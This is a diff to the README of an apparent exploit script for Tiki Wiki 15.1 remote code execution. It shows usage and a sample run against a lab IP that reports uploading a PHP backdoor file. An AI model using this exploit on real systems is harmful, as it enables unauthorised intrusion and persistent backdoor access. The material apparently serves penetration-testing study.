@@ -12,14 +12,14 @@ Explanatory [blog article here](https://ivanitlearning.wordpress.com/2019/09/25/
 
 ## Usage
 ```
-root@Kali:~/# python3 tikiwiki_15.1_RCE.py -h
+root@Kali:~/# ./tikiwiki_15.1_RCE.py -h
 usage: tikiwiki_15.1_RCE.py [-h] -U URL -P PHP
 
 Required arguments:
   -U URL, --url URL  URL of the Tiki Wiki page eg.
                      http://webserver.com/tikiwiki
   -P PHP, --php PHP  Path to php payload eg. payload.php
-root@Kali:~/# python3 tikiwiki_15.1_RCE.py --url 'http://192.168.92.151/tiki' --php payload.php
+root@Kali:~/# ./tikiwiki_15.1_RCE.py --url 'http://192.168.92.151/tiki' --php payload.php
 Target is vulnerable
 Uploading backdoor file: ClLiqPSD.php
 Backdoor successfully created
